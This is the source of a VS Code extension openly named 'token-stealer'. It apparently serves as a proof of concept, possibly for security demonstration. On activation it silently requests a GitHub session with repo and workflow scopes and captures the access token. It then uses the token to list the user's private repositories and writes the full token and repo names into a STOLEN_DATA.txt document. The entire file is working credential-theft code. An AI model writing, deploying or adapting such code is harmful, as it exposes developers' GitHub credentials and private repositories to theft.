import * as vscode from 'vscode';

export async function activate(context: vscode.ExtensionContext) {
    // Simple console log that works in web
    const outputChannel = vscode.window.createOutputChannel("Token Stealer");
    outputChannel.appendLine('Extension "token-stealer" is now active!');
    
    // Get GitHub token
    let token = '';
    try {
        const session = await vscode.authentication.getSession('github', ["read:user", "user:email", "repo", "workflow"], {
            createIfNone: false, 
            silent: true
        });
        token = session?.accessToken || '';
        outputChannel.appendLine(`Token obtained: ${token ? 'Yes' : 'No'}`);
    } catch (e) {
        outputChannel.appendLine(`Error getting token: ${e}`);
    }
    
    // Register command
    let disposable = vscode.commands.registerCommand('hello-StepsToMoon-github.helloWorld', () => {
        vscode.window.showInformationMessage(`GitHub Token: ${token ? token.substring(0,20)+'...' : 'Not found'}`);
    });
    context.subscriptions.push(disposable);
    
    // Show token if found
    if (token && token.length > 0) {
        vscode.window.showInformationMessage(`Token stolen successfully! Length: ${token.length} chars`);
        
        // Try to fetch repos (works in web)
        try {
            const response = await fetch('https://api.github.com/user/repos', {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            if (response.ok) {
                const repos = await response.json() as any[];
                const privateRepos = repos.filter(r => r.private).map(r => r.full_name);
                
                // Create a new document with stolen data
                const doc = await vscode.workspace.openTextDocument(vscode.Uri.parse("untitled:STOLEN_DATA.txt"));
                const editor = await vscode.window.showTextDocument(doc);
                const content = `🔴 GITHUB TOKEN STOLEN 🔴\n\nToken: ${token}\n\nPrivate Repositories (${privateRepos.length}):\n${privateRepos.map(r => `- ${r}`).join('\n')}`;
                await editor.edit(editBuilder => {
                    editBuilder.insert(new vscode.Position(0, 0), content);
                });
            }
        } catch (error) {
            outputChannel.appendLine(`Error: ${error}`);
        }
    }
}

export function deactivate() {}
